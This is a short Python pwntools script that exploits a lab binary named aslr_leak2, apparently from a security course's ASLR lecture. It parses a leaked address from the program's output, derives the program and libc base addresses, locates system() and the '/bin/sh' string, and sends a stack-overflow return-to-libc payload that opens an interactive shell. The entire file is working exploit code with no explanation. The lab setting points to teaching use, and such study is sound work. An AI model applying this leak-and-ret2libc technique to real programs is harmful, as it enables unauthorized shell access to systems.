#!/usr/bin/python
from pwn import *
context.terminal = ['tmux', 'new-window']
e = ELF("/levels/lecture/aslr/aslr_leak2")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
payload = b'A' * 16

use_gdb = False

if use_gdb:
    io = gdb.debug(['/levels/lecture/aslr/aslr_leak2', payload], '''
    break main
    break *main+160
    continue
    ''')
    io.recvline()
else:
    io = process([e.path, payload])

prompt = io.recvline()
addr = prompt[-5:-1]

program_base = u32(addr) - 0x0820
system = program_base - 0x19ecf0
libc.address = system - 0x00040310
bin_sh = next(libc.search("/bin/sh"))
print(hex(system))
print(hex(system - 0x00040310))
print(hex(bin_sh))

io.sendline(b'a' * 28 + p32(system) + 'AAAA' + p32(bin_sh))
io.interactive()
